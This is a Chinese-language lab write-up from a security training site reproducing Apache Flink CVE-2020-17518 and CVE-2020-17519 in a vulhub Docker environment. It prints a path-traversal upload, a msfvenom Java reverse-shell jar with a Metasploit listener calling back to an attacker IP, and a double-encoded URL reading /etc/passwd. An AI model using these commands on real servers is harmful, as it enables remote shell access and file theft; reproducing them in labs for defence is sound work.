# Apache Flink CVE-2020-17519/17518 漏洞复现 - 合天网安实验室 - 博客园

> 原文：[`www.cnblogs.com/hetianlab/p/14292699.html`](https://www.cnblogs.com/hetianlab/p/14292699.html)

本文首发于“合天网安实验室”    作者：浅墨

涉及知识点实操练习-网络安全事件  

[课程:网络安全事件(合天网安实验室)](https://www.hetianlab.com/cour.do?w=1&c=C172.19.104.182015010409302300001&pk_campaign=bokeyuan-wemedia)   （点击链接做实验）

“网络安全事件”这门课程是由一些影响比较大的安全事件所模拟的测试环境组成。此课程不仅会添加以往的安全事件，而且还会紧跟时事，去添加最新的安全事件。让大家在第一时间了解，并懂得怎么去保护自身安全为目的。

**简介**

Apache Flink 是高效和分布式的通用数据处理平台，由 Apache 软件基金会开发的开源流处理框架，其核心是用 Java 和 Scala 编写的分布式流数据流引擎（简单来说，就是跟 spark 类似）。Flink 具有监控 API，可用于查询"正在运行的 jobs" 和 "最近完成的 jobs" 的状态和统计信息。该监控 API 被用于 Flink 自己的 dashboard，同时也可用于自定义监控工具，默认监听在 8081 端口。

![](img/a1a4855cc23bb9f102c75afb04802810.png)

该监控 API 是 REST-ful API, 即接受 HTTP 请求，并响应 JSON 格式的数据。

监控 API 中有一个 API 是 /jars/upload，其作用是将一个 jar 上传到集群。该 jar 必须作为多部分数据发送。确保“ Content-Type”标头设置为“ application / x-java-archive”，因为某些 http 库默认情况下不添加标头。可以通过 curl 上传 jar 文件

```
'curl -X POST -H "Expect:" -F "jarfile=@path/to/flink-job.jar" http://hostname:port/jars/upload'
```

**概述**

Flink 1.5.1 引入了 REST API，但其实现上存在多处缺陷，导致任意文件读取（CVE-2020-17519）和任意文件写入（CVE-2020-17518）漏洞。

CVE-2020-17518 攻击者利用 REST API，可以修改 HTTP 头，将上传的文件写入到本地文件系统上的任意位置（Flink 1.5.1 进程能访问到的）。

CVE-2020-17519Apache Flink 1.11.0 允许攻击者通过 JobManager 进程的 REST API 读取 JobManager 本地文件系统上的任何文件（JobManager 进程能访问到的）。

**影响版本**

CVE-2020-17518

Apache:Apache Flink: 1.5.1 - 1.11.2

CVE-2020-17519

Apache:Apache Flink: 1.11.0, 1.11.1, 1.11.2

**环境搭建**

因为受到两个漏洞影响的版本都包含了 1.11.2，所以统一使用这个版本进行复现

此处利用 vulhub 的环境进行复现，新建 docker-compose.yml

```
version: '2' services:
 flink:
   image: vulhub/flink:1.11.2 command: jobmanager
   ports: - "8081:8081"
    - "6123:6123"
```

使用 docker-compose 启动该环境,执行以下命令会下载镜像并以此镜像启动一个容器，映射的端口为 8081 和 6123

docker-compose up -d

访问 http://ip:8081

![](img/800a2892540d882971576f1b96b7ca08.png)

**漏洞复现**

任意文件上传（CVE-2020-17518）复现：

Apache Flink 1.5.1 引入了 REST 处理程序，该处理程序允许通过经过恶意修改的 HTTP HEADER 将上传的文件写入本地文件系统上的任意位置。

访问 http://ip:8081，找到 Submit New Job 的 Add New 上传一个 jar 包，jar 包可以在桌面新建一个压缩文件，将 zip 后缀修改为 jar 即可，然后抓包

![](img/890f8145389663bb56c38a72b4e52a8d.png)

抓到的请求包如下：

![](img/de30c55f9fe4e826e277fc304125503e.png)

将请求包发送到 repeater 模块进行修改，比如我这里是在/tmp 目录下新建一个文件，../是为了方便切换路径，因为我们不知到当前的路径是什么，所以可以使用../切换到根目录。

![](img/c1898a398bf2409c05f2ff18e9fe2a75.png)

查看文件是否上传成功

docker ps 查看容器

![](img/020eb6360e527b54cb15b915d7703e3f.png)

进入容器

```
docker exec -it CONTAINER ID /bin/bash
```

可以看到文件成功上传

![](img/93134169bbd74e08261513a2e69debb8.png)

flink 本身是没有鉴权的，并且它本身支持任意 jar 包上传并执行，所以可以通过上传 jar 包 getshell

生成 jar 格式的马

lhost 为 kali 的 ip，lport 为 kali 接收 shell 的端口

```
msfvenom -p java/shell_reverse_tcp lhost=192.168.74.142 lport=1234 -f jar >/home/a.jar
```

![](img/ad6f0a0114f3b5e0a8d334b39c0c7b4a.png)

启动 msf 接收 shell

```
msfconsole
use exploit/multi/handler set payload java/shell_reverse_tcp set LHOST 192.168.74.142
set LPORT 1234 exploit
```

将 jar 包上传后点击上传的包然后 Submit

![](img/f7340e225bd01b97ca297bd39256f540.png)

获取到 shell

![](img/de0498c15c571779851b04ceef76b10d.png)

**任意文件读取（CVE-2020-17519）复现：**

Apache Flink 1.11.0 中引入的更改（以及 1.11.1 和 1.11.2 中也发布）允许攻击者通过 JobManager 进程的 REST 接口读取 JobManager 本地文件系统上的任何文件。访问仅限于 JobManager 进程可访问的文件。

比如我这里读取/etc/下的 passwd 文件,%252f 为/的两次 url 编码

```
http://192.168.74.134:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
```

![](img/80f4275f79cac2b0fb81325b67dec062.png)

**漏洞修复**

官方已发布安全版本，请及时下载升级至安全版本。

[`flink.apache.org/zh/downloads.html`](https://flink.apache.org/zh/downloads.html)

**参考链接**

[`github.com/vulhub/vulhub/tree/master/flink`](https://github.com/vulhub/vulhub/tree/master/flink)
[`www.anquanke.com/post/id/227668`](https://www.anquanke.com/post/id/227668)